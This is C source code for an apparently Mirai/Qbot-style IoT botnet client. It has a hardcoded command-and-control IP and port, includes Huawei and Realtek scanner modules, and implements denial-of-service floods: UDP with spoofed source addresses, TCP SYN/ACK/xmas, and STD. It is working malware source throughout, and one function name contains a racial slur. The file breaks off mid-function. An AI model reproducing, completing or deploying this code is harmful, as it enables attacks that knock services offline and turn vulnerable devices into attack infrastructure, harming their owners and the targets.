#define _GNU_SOURCE

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "headers/xor.h"
#include "headers/rand.h"
#include "headers/includes.h"
#include "headers/util.h"
#include "headers/killer.h"
#include "headers/huawei_scanner.h"
#include "headers/realtek_scanner.h"

#ifdef SCANNER
#include "headers/scanner.h"
#endif

#define LST_SZ (sizeof(KYT), sizeof(KYT2), sizeof(KYT3), sizeof(KYT4))
#define RGHT 1
#define ZRO 2
#define PBL 12
#define ST_NM 15
#define STD_PIGZ 75
#define MAX_ATTACKS 10
#define std_packet 1458
#define std_packets 1460

int KYT[] = {45}; //45.95.169.115
int KYT2[] = {95};
int KYT3[] = {169};
int KYT4[] = {115};

int port = 37009;
struct in_addr ourIP;

int LayerSock = 0, SRV = -1, ioctl_pid = 0;
uint32_t *pids;
uint64_t numpids = 0;
static uint32_t Q[4096], c = 362436;

int socket_connect(char *host, in_port_t port) {
    struct hostent *hp;
    struct sockaddr_in addr;
    int on = 1, sock;     
    if ((hp = gethostbyname(host)) == NULL) return 0;
    bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
    return sock;
}


const char *useragents[] = {
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
    "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "TheSuBot/0.2 (www.thesubot.de)",
    "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
    "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
    "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "zspider/0.9-dev http://feedback.redkolibri.com/",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
    "Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
    "Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60",
    "Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532",
    "Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
    "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8", 
    "Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01", 
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
    "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1",
    "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
};

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin])) begin++;

    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];

    str[i - begin] = '\0';
}

uint32_t CMWC(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (uint32_t)(t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
int getHost(unsigned char *toGet, struct in_addr *i) {
    struct hostent *h;
    if ((i->s_addr = inet_addr(toGet)) == -1) return 1;
    return 0;
}

in_addr_t GRI(in_addr_t netmask) {
    in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
    return tmp ^ (CMWC() & ~netmask);
}

unsigned short csum(unsigned short *buf, int count) {
    register uint64_t sum = 0;
    while (count > 1) {
        sum += *buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += *(unsigned char *) buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc((size_t) totaltcp_len);
    memcpy((unsigned char *) tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *) tcp + sizeof(struct tcp_pseudo), (unsigned char *) tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}
in_addr_t findRandIP(in_addr_t netmask)
{
in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
return tmp ^ ( rand_cmwc() & ~netmask);
}
void MIP(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + packetSize;
    iph->id = CMWC();
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = protocol;
    iph->check = 0;
    iph->saddr = source;
    iph->daddr = dest;
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    char *alphaset = "qC8cVuGTnRH6cfv7sjcYPFv7guAmZxbQRc57fV77IUUj5b6wocpfFJPmHC";
    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_cmwc();;

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_cmwc() % (sizeof (alphaset));
            len--;
        }
    }
}

static void printchar(unsigned char **str, int c) {
    if (str) {
        **str = c;
        ++(*str);
    } else (void) write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad) {
    register int pc = 0, padchar = ' ';
    if (width > 0) {
        register int len = 0;
        register const unsigned char *ptr;
        for (ptr = string; *ptr; ++ptr) ++len;
        if (len >= width) width = 0;
        else width -= len;
        if (pad & ZRO) padchar = '0';
    }
    if (!(pad & RGHT)) {
        for (; width > 0; --width) {
            printchar(out, padchar);
            ++pc;
        }
    }
    for (; *string; ++string) {
        printchar(out, *string);
        ++pc;
    }
    for (; width > 0; --width) {
        printchar(out, padchar);
        ++pc;
    }
    return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase) {
    unsigned char print_buf[PBL];
    register unsigned char *s;
    register int t, neg = 0, pc = 0;
    register unsigned int u = i;
    if (i == 0) {
        print_buf[0] = '0';
        print_buf[1] = '\0';
        return prints(out, print_buf, width, pad);
    }
    if (sg && b == 10 && i < 0) {
        neg = 1;
        u = -i;
    }
    s = print_buf + PBL - 1;
    *s = '\0';

    while (u) {
        t = u % b;
        if (t >= 10)
            t += letbase - '0' - 10;
        *--s = t + '0';
        u /= b;
    }

    if (neg) {
        if (width && (pad & ZRO)) {
            printchar(out, '-');
            ++pc;
            --width;
        } else {
            *--s = '-';
        }
    }

    return pc + prints(out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args) {
    register int width, pad;
    register int pc = 0;
    unsigned char scr[2];

    for (; *format != 0; ++format) {
        if (*format == '%') {
            ++format;
            width = pad = 0;
            if (*format == '\0') break;
            if (*format == '%') goto out;
            if (*format == '-') {
                ++format;
                pad = RGHT;
            }
            while (*format == '0') {
                ++format;
                pad |= ZRO;
            }
            for (; *format >= '0' && *format <= '9'; ++format) {
                width *= 10;
                width += *format - '0';
            }
            if (*format == 's') {
                table_unlock_val(XOR_NULL);
                register char *s = (char *) va_arg(args, int);
                pc += prints(out, s ? s : table_retrieve_val(XOR_NULL, NULL), width, pad);
                table_lock_val(XOR_NULL);
                continue;
            }
            if (*format == 'd') {
                pc += printi(out, va_arg(args, int), 10, 1, width, pad, 'a');
                continue;
            }
            if (*format == 'x') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'X') {
                pc += printi(out, va_arg(args, int), 16, 0, width, pad, 'A');
                continue;
            }
            if (*format == 'u') {
                pc += printi(out, va_arg(args, int), 10, 0, width, pad, 'a');
                continue;
            }
            if (*format == 'c') {
                scr[0] = (unsigned char) va_arg(args, int);
                scr[1] = '\0';
                pc += prints(out, scr, width, pad);
                continue;
            }
        } else {
            out:
            printchar(out, *format);
            ++pc;
        }
    }
    if (out) **out = '\0';
    va_end(args);
    return pc;
}

int SZP(unsigned char *out, const unsigned char *format, ...) {
    va_list args;
    va_start(args, format);
    return print(&out, format, args);
}

int LayerPrint(int sock, char *formatStr, ...) {
    unsigned char *textBuffer = malloc(2048);
    memset(textBuffer, 0, 2048);
    char *orig = textBuffer;
    va_list args;
    va_start(args, formatStr);
    print(&textBuffer, formatStr, args);
    va_end(args);
    orig[strlen(orig)] = '\n';
    int q = send(sock, orig, strlen(orig), MSG_NOSIGNAL);
    free(orig);
    return q;
}

int recvLine(int socket, unsigned char *buf, int bufsize) {
    memset(buf, 0, bufsize);

    fd_set myset;
    struct timeval tv;
    tv.tv_sec = 30;
    tv.tv_usec = 0;
    FD_ZERO(&myset);
    FD_SET(socket, &myset);
    int selectRtn, retryCount;
    if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
        while (retryCount < 10) {

            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(socket, &myset);
            if ((selectRtn = select(socket + 1, &myset, NULL, &myset, &tv)) <= 0) {
                retryCount++;
                continue;
            }

            break;
        }
    }

    unsigned char tmpchr;
    unsigned char *cp;
    int count = 0;

    cp = buf;
    while (bufsize-- > 1) {
        if (recv(LayerSock, &tmpchr, 1, 0) != 1) {
            *cp = 0x00;
            return -1;
        }
        *cp++ = tmpchr;
        if (tmpchr == '\n') break;
        count++;
    }
    *cp = 0x00;
    return count;
}
void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
int connectTimeout(int fd, char *host, int port, int timeout) {
    struct sockaddr_in dest_addr;
    fd_set myset;
    struct timeval tv;
    socklen_t lon;

    int valopt;
    long arg = fcntl(fd, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(fd, F_SETFL, arg);

    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    dest_addr.sin_addr.s_addr = inet_addr(host);

    int res = connect(fd, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(fd, &myset);
            if (select(fd + 1, NULL, &myset, NULL, &tv) > 0) {
                lon = sizeof(int);
                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void *) (&valopt), &lon);
                if (valopt) return 0;
            } else return 0;
        } else return 0;
    }

    arg = fcntl(fd, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(fd, F_SETFL, arg);

    return 1;
}

int listFork() {
    uint32_t parent, *newpids, i;
    parent = fork();
    if (parent <= 0) return parent;
    numpids++;
    newpids = (uint32_t *) malloc((numpids + 1) * 4);
    for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
    newpids[numpids - 1] = parent;
    free(pids);
    pids = newpids;
    return parent;
}

char *GB() {
#if defined(__x86_64__) || defined(_M_X64)
    return "1";
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "1";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "2";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "5";
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "6";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "7";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "3";
#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "4";
#elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "10";
#else
    return "0";
#endif
}

void attack_udp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime)
{
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
if(port == 0) dest_addr.sin_port = rand_cmwc();
else dest_addr.sin_port = htons(port);
if(getHost(target, &dest_addr.sin_addr)) return;
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
register unsigned int pollRegister;
pollRegister = pollinterval;
if(spoofit == 32) {
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) {
return;
}
unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
if(buf == NULL) return;
memset(buf, 0, packetsize + 1);
makeRandomStr(buf, packetsize);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
if(i == pollRegister) {
if(port == 0) dest_addr.sin_port = rand_cmwc();
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
} else {
int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
if(!sockfd) {
return;
}
int tmp = 1;
if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) {
return;
}
int counter = 50;
while(counter--) {
srand(time(NULL) ^ rand_cmwc());
init_rand(rand());
}
in_addr_t netmask;
if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
else netmask = ( ~((1 << (32 - spoofit)) - 1) );
unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
struct iphdr *iph = (struct iphdr *)packet;
struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
udph->len = htons(sizeof(struct udphdr) + packetsize);
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
udph->check = 0;
makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
iph->check = csum ((unsigned short *) packet, iph->tot_len);
int end = time(NULL) + timeEnd;
register unsigned int i = 0;
register unsigned int ii = 0;
while(1) {
sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
udph->source = rand_cmwc();
udph->dest = (port == 0 ? rand_cmwc() : htons(port));
iph->id = rand_cmwc();
iph->saddr = htonl( findRandIP(netmask) );
iph->check = csum ((unsigned short *) packet, iph->tot_len);
if(i == pollRegister) {
if(time(NULL) > end) break;
i = 0;
continue;
}
i++;
if(ii == sleepcheck) {
usleep(sleeptime*1000);
ii = 0;
continue;
}
ii++;
}
}
}
void tcpfl00d(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize,
          int pollinterval) {
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = CMWC();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (!sockfd) {
        return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        return;
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (void *) iph + sizeof(struct iphdr);

    MIP(iph, dest_addr.sin_addr.s_addr, htonl(GRI(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph->source = CMWC();
    tcph->seq = CMWC();
    tcph->ack_seq = 0;
    tcph->doff = 5;

    if (!strcmp(flags, "xmas")) {
        tcph->syn = 1;
        tcph->rst = 1;
        tcph->fin = 1;
        tcph->ack = 1;
        tcph->psh = 1;
    }

    if (!strcmp(flags, "syn")) {
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->fin = 0;
        tcph->ack = 0;
        tcph->psh = 0;
    }

    if (!strcmp(flags, "ack")) {
        tcph->syn = 0;
        tcph->rst = 0;
        tcph->fin = 0;
        tcph->ack = 1;
        tcph->psh = 0;
    }

    if (!strcmp(flags, "asyn")) {
        tcph->syn = 1;
        tcph->rst = 0;
        tcph->fin = 0;
        tcph->ack = 1;
        tcph->psh = 0;
    }

    tcph->window = CMWC();
    tcph->check = 0;
    tcph->urg_ptr = 0;
    tcph->dest = (port == 0 ? CMWC() : htons(port));
    tcph->check = tcpcsum(iph, tcph);

    iph->check = csum((unsigned short *) packet, iph->tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while (1) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr));

        iph->saddr = htonl(GRI(netmask));
        iph->id = CMWC();
        tcph->seq = CMWC();
        tcph->source = CMWC();
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);
        iph->check = csum((unsigned short *) packet, iph->tot_len);

        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}
void s4yniggerfl00d(unsigned char *ip, int port, int secs)
    {
    int std_hex;
    std_hex = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    hp = gethostbyname(ip);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;
    unsigned int a = 0;
    while(1)
    {
        char *rhexstring[] = {
            "\x6c\x58\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x76\x39\x38\x32\x77\x75\x49\x69\x4b\x63\x48\x6c\x67\x46\x41\x30\x6a\x45\x73\x57\x32\x4f\x46\x51\x53\x74\x4f\x37\x78\x36\x7a\x4e\x39\x64\x42\x67\x61\x79\x79\x57\x67\x76\x62\x6b\x30\x4c\x33\x6c\x5a\x43\x6c\x7a\x4a\x43\x6d\x46\x47\x33\x47\x56\x4e\x44\x46\x63\x32\x69\x54\x48\x4e\x59\x79\x37\x67\x73\x73\x38\x64\x48\x62\x6f\x42\x64\x65\x4b\x45\x31\x56\x63\x62\x6c\x48\x31\x41\x78\x72\x56\x79\x69\x71\x6f\x6b\x77\x32\x52\x59\x46\x76\x64\x34\x63\x64\x31\x51\x78\x79\x61\x48\x61\x77\x77\x50\x36\x67\x6f\x39\x66\x65\x42\x65\x48\x64\x6c\x76\x4d\x52\x44\x4c\x62\x45\x62\x74\x79\x33\x50\x79\x38\x79\x56\x54\x33\x55\x54\x6a\x79\x33\x5a\x4b\x4f\x4e\x58\x6d\x4d\x4e\x76\x55\x52\x54\x55\x5a\x54\x6b\x65\x48\x33\x37\x58\x54\x39\x48\x35\x4a\x77\x48\x30\x76\x4b\x42\x31\x59\x77\x32\x72\x53\x59\x6b\x54\x77\x63\x54\x76\x78\x36\x4f\x6c\x74\x53\x49\x6c\x61\x68\x46\x67\x39\x32\x75\x43\x52\x62\x4c\x4d\x38\x61\x6d\x68\x38\x47\x61\x47\x47\x47\x52\x77\x35\x36\x69\x4e\x55\x54\x47\x4c\x67\x69\x33\x39\x35\x76\x6a\x39\x5a\x56\x56\x65\x50\x30\x31\x6b\x37\x54\x76\x71\x33\x4e\x52\x76\x78\x6f\x23\x23\x23\x23\x23\x23\x23\x23\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x40\x21\x40\x21\x40\x24\x21\x25\x40\x26\x24\x5e\x21\x40\x25\x25\x5e\x21\x40\x25\x2a\x21\x28\x40\x25\x26\x2a\x28\x21\x40\x25\x26\x21\x40\x2a\x28\x25\x26\x21\x40\x28\x29\x25\x2a\x21\x40\x25\x29\x29"
        };
        if (a >= 50)
        {
            send(std_hex, rhexstring, std_packet, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
void sstdstr(unsigned char *target, uint16_t port, int duration, int psize)
{
#ifdef DEBUG
        printf("[std-flood] attack sent for %d seconds \n", duration);
#endif
    char *data = malloc(psize);
    struct sockaddr_in MainSock;
    int mysock = socket(AF_INET, SOCK_DGRAM, 0);
    MainSock.sin_family = AF_INET;
    MainSock.sin_addr.s_addr = inet_addr(target);
    MainSock.sin_port = htons(port);
    int end;
    end = time(NULL) + duration;
    while(end > time(NULL))
    {
        data[psize] = (char)((rand() % 70) + 30);
        connect(mysock, (struct sockaddr *)&MainSock, sizeof(MainSock));
        send(mysock, data, psize, 0);
    }
#ifdef DEBUG
        printf("[std-flood] attack finished! \n");
#endif
